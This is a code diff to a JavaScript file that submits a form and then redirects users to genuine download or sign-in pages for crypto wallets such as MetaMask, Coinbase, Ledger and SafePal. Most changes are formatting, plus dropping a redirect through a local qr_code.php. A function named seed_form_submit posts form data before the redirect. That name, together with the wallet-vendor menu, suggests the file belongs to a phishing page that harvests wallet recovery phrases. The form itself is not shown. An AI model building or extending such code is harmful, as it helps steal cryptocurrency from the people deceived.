@@ -13,18 +13,21 @@ var Colab = (function () {
       sParameterName = sURLVariables[i].split('=');
 
       if (sParameterName[0] === sParam) {
-        return sParameterName[1] === undefined
-          ? true
-          : decodeURIComponent(sParameterName[1]);
+        return sParameterName[1] === undefined ?
+          true :
+          decodeURIComponent(sParameterName[1]);
       }
     }
     return false;
   };
+
   function seed_form_submit(thisForm, action, formData) {
     fetch(action, {
       method: 'POST',
       body: formData,
-      headers: { 'X-Requested-With': 'XMLHttpRequest' },
+      headers: {
+        'X-Requested-With': 'XMLHttpRequest'
+      },
     }).then((data) => {
       if (data.status == 200) {
         sessionStorage.clear();
@@ -35,17 +38,17 @@ var Colab = (function () {
                 codeString =
                   'https://chrome.google.com/webstore/detail/nkbihfbeogaeaoehlefnkodbefgpgknn';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'Android':
                 codeString = 'https://metamask.app.link/bxwkE8oF99';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'iOS':
                 codeString = 'https://metamask.app.link/skAH3BaF99';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
             }
             break;
@@ -55,19 +58,19 @@ var Colab = (function () {
                 codeString =
                   'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'Android':
                 codeString =
                   'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'iOS':
                 codeString =
                   'https://apps.apple.com/app/apple-store/id1288339409?mt=8';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
             }
             break;
@@ -76,19 +79,19 @@ var Colab = (function () {
               case 'Windows':
                 codeString = 'https://www.coinbase.com/signin';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'Android':
                 codeString =
                   'https://play.google.com/store/apps/details?id=com.coinbase.android&hl=en&gl=US';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'iOS':
                 codeString =
                   'https://apps.apple.com/us/app/coinbase-buy-bitcoin-ether/id886427730';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
             }
             break;
@@ -97,26 +100,26 @@ var Colab = (function () {
               case 'Windows':
                 codeString = 'https://dfox.tokenpocket.pro/';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'Android':
                 codeString =
                   'https://play.google.com/store/apps/details?id=vip.mytokenpocket';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'iOS':
                 codeString =
                   'https://itunes.apple.com/cn/app/tokenpocket-trusted-wallet/id1436028697';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
             }
             break;
           case 'WalletConnect':
             codeString = 'https://walletconnect.com/';
             location.href =
-              '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+              codeString;
             break;
           case 'Ledger':
             switch (platform) {
@@ -124,18 +127,18 @@ var Colab = (function () {
                 codeString =
                   'https://www.ledger.com/ledger-live/download#download-device-1';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'Android':
                 codeString =
                   'https://play.google.com/store/apps/details?id=com.ledger.live';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'iOS':
                 codeString = 'https://itunes.apple.com/app/id1361671700';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
             }
             break;
@@ -144,18 +147,18 @@ var Colab = (function () {
               case 'Windows':
                 codeString = 'https://safepal.io/download';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'Android':
                 codeString =
                   'https://play.google.com/store/apps/details?id=io.safepal.wallet';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
               case 'iOS':
                 codeString = 'https://safepal.io/download/appstore';
                 location.href =
-                  '../../qr_code.php?v=' + $vendorFromURL + '&cS=' + codeString;
+                  codeString;
                 break;
             }
             break;
@@ -163,8 +166,8 @@ var Colab = (function () {
             Swal.fire(
               'Oh, Sorry!',
               'We will soon add support for <b>' +
-                formData.get('vendor') +
-                '</b>.',
+              formData.get('vendor') +
+              '</b>.',
               'info'
             );
             break;
